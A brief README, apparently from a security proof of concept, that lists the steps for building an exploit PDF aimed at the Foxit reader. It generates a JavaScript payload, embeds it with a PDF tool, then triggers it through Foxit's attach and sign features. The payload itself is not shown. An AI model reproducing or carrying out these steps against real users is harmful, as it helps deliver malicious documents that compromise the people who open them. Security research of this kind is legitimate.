We use a small pdf generator from [Didier Stevens](https://blog.didierstevens.com/programs/pdf-tools/)

To generate the exploit:

1. Generate a js payload using generate-js.py
```sh
$ python generate-js.py > test.js
```

2. Use make-pdf-javascript to generate a pdf with that JS embedded
```sh
$ python make-pdf-javascript.py -f test.js test.pdf
```

3. Open the pdf in Foxit and attach bitcoins.pdf and then use "Sign" feature in "Protect" to sign the pdf.
